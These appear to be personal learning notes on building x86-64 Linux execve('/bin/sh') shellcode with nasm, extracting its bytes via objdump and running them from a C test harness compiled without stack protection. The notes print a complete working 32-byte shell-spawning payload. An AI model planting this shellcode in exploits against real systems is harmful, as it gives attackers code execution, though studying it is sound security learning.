```bash
python2
Python 2.7.18 (v2.7.18:8d21aa21f2, Apr 19 2020, 20:48:48) 
[GCC 4.2.1 Compatible Apple LLVM 6.0 (clang-600.0.57)] on darwin
Type "help", "copyright", "credits" or "license" for more information.
>>> string = '//bin/sh'
>>> string
'//bin/sh'
>>> encode_string = string[::-1].encode('hex')
>>> encode_string
'68732f6e69622f2f'
>>> 
```


```bash
lynk@Linux ~/a/execve-syscall> ls
a.out*  bash*  bash-shell.c  execve.asm  r.md  sysinfo.c
lynk@Linux ~/a/execve-syscall> nasm -f elf64 execve.asm -o execve.o
lynk@Linux ~/a/execve-syscall> ld execve.o -o execve
lynk@Linux ~/a/execve-syscall> ./execve 
fish: Job 1, './execve' terminated by signal SIGSEGV (Address boundary error)
lynk@Linux ~/a/execve-syscall [SIGSEGV]> 


```

### segementation fault  : fixing........

```bash
lynk@Linux ~/a/execve-syscall> nasm -f elf64 execve.asm -o execve.o
lynk@Linux ~/a/execve-syscall> ld execve.o -o execve
lynk@Linux ~/a/execve-syscall> ./execve 
$ 

```




## now we will convert this into shell code:

```bash
lynk@Linux ~/a/execve-syscall> ls
a.out*  bash*  bash-shell.c  execve*  execve.asm  execve.o  r.md  sysinfo.c
lynk@Linux ~/a/execve-syscall> objdump -M intel -D execve | grep '[0-9a-f]:' | grep -v 'file' | cut -f2 -d: | cut -f1-7 -d' ' | tr -s ' ' | tr '\t' ' ' | sed 's/ $//g' | sed 's/ /\\\x/g' | paste -d '' -s
\x48\x31\xc0\x50\x48\x89\xe2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05
lynk@Linux ~/a/execve-syscall> 

```

\x48\x31\xc0\x50\x48\x89\xe2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05




```c
#include <stdio.h>
#include <string.h>

int main() {

	unsigned char shellcode[] = "\x48\x31\xc0\x50\x48\x89\xe2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05";
	printf("shellcode length: %zu\n", strlen((const char*)shellcode));
	int (*ret)() = (int(*)())shellcode;
	ret();
}


```

now we will compile it........

```bash
lynk@Linux ~/a/execve-syscall> ls
bash*  bash-shell.c  execve*  execve.asm  execve.o  execve-shell.c  r.md  sysinfo.c
lynk@Linux ~/a/execve-syscall> gcc -fno-stack-protector -z execstack execve-shell.c
lynk@Linux ~/a/execve-syscall> ls
a.out*  bash*  bash-shell.c  execve*  execve.asm  execve.o  execve-shell.c  r.md  sysinfo.c
lynk@Linux ~/a/execve-syscall> ./a.out 
shellcode length: 32
$ whoami
lynk
$ 

```

